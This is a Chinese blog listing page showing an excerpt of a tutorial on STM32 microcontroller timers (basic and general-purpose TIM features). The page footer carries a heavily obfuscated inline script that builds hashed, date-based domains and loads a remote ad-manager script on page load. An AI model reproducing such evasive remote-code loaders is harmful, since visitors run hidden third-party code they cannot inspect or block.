		00. 目录 文章目录 00. 目录01. TIM简介02. 定时器类型03. 基本定时器04. 通用定时器05. 高级定时器06. 定时中断基本结构07. 预分频器时序08. 计数器时序09. 计数器无预装时序10. 计数器有预装时序11. RCC时钟树12. 附录 01. TIM简介 TIM（Timer）定时器定时器可以对输入的时钟进行计数，并在计数值达到设定值时触发中断16位计数器、预分频器、自动重装寄存器的时基单元，在72MHz计数时钟下可以实现最大59.65s的定时不仅具备基本的定时中断功能，而且还包含内外时钟源选择、输入捕获、输出比较、编码器接口、主从触发模式等多种功能根据复杂度和应用场景分为了高级定时器、通用定时器、基本定时器三种类型 02. 定时器类型 STM32F103C8T6定时器资源：TIM1、TIM2、TIM3、TIM4
03. 基本定时器 基本定时器TIM6和TIM7各包含一个16位自动装载计数器，由各自的可编程预分频器驱动。
它们可以作为通用定时器提供时间基准，特别地可以为数模转换器(DAC)提供时钟。实际上，它们在芯片内部直接连接到DAC并通过触发输出直接驱动DAC。
这2个定时器是互相独立的，不共享任何资源。
TIM6 和TIM7 的主要特性
TIM6和TIM7定时器的主要功能包括：
● 16位自动重装载累加计数器
● 16位可编程(可实时修改)预分频器，用于对输入的时钟按系数为1～65536之间的任意数值分频
● 触发DAC的同步电路
● 在更新事件(计数器溢出)时产生中断/DMA请求
04. 通用定时器 通用定时器是一个通过可编程预分频器驱动的16位自动装载计数器构成。
它适用于多种场合，包括测量输入信号的脉冲长度(输入捕获)或者产生输出波形(输出比较和PWM)。
使用定时器预分频器和RCC时钟控制器预分频器，脉冲长度和波形周期可以在几个微秒到几个毫秒间调整。
每个定时器都是完全独立的，没有互相共享任何资源。它们可以一起同步操作
通用TIMx (TIM2、TIM3、TIM4和TIM5)定时器功能包括：
● 16位向上、向下、向上/向下自动装载计数器
● 16位可编程(可以实时修改)预分频器，计数器时钟频率的分频系数为1～65536之间的任意数值
● 4个独立通道：
─ 输入捕获
─ 输出比较
─ PWM生成(边缘或中间对齐模式)
─ 单脉冲模式输出
● 使用外部信号控制定时器和定时器互连的同步电路
● 如下事件发生时产生中断/DMA：
─ 更新：计数器向上溢出/向下溢出，计数器初始化(通过软件或者内部/外部触发)
─ 触发事件(计数器启动、停止、初始化或者由内部/外部触发计数)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48d26fd67022086113124922071dccc7/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/27/">«</a>
	<span class="pagination__item pagination__item--current">28/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/29/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>